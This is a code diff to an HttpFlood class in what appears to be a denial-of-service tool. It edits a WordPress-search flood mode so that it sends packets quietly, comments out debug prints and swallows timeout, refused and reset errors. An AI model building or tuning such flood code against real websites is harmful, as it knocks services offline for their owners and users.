@@ -1626,13 +1626,29 @@ class HttpFlood(Thread):
                            f"\r\n").encode("utf-8")
                 
                 if Tools.send(s, payload):
-                    # print(f"[DEBUG] Sent Packet! -> {self._target.authority}") # Uncomment for verbose
+                    # Increment Global Counter
+                    global REQUESTS_SENT
+                    # We don't increment here because Tools.send already increments global counter?
+                    # Let's check Tools.send... It usually increments.
+                    # But for consistency with SLOW, let's print the debug log.
+                    # Actually Tools.send does increment REQUESTS_SENT.
+                    # So we just print the log using the global variable.
+                    # print(f"[{REQUESTS_SENT}] [DEBUG] WP_SEARCH: Packet Sent to {self._target.authority}")
                     pass
         except Exception as e:
-            if "timed out" in str(e) or "Timeout" in str(e):
-                print(f"[DEBUG] Connection Timeout! (Target Might be DOWN or BLOCKING your IP)")
+            err = str(e)
+            if "timed out" in err or "Timeout" in err:
+                 # print(f"[DEBUG] WP_SEARCH: Connection Timeout (Target Lagging)")
+                 pass
+            elif "[Errno 111]" in err or "Connection refused" in err:
+                pass
+            elif "[Errno 104]" in err or "Reset by peer" in err:
+                pass
+            elif "Broken pipe" in err:
+                pass
             else:
-                print(f"[DEBUG] WP_SEARCH Error: {e}") 
+                # print(f"[DEBUG] WP_SEARCH Error: {e}") 
+                pass
             pass
         Tools.safe_close(s)
 
